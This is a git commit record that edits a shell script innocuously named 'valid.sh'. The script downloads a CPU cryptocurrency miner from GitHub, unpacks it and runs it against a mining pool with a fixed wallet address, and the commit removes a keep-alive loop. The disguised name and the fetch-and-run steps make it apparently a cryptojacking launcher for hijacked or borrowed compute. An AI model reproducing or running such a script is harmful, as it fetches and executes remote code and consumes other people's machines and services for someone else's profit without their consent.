2a3a086eda2e543690bffc6a22ecbb418489e281
squibex <90225595+squibex@users.noreply.github.com>
2021-09-10 10:14:30 +0700

    Update valid.sh

--- valid.sh
+++ valid.sh
@@ -4,7 +4,4 @@ sudo apt install screen -y
 wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
 tar xf hellminer_cpu_linux.tar.gz
 ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW.worke -p x --cpu 2
-while [ 1 ]; do
-sleep 3
-done
 sleep 999
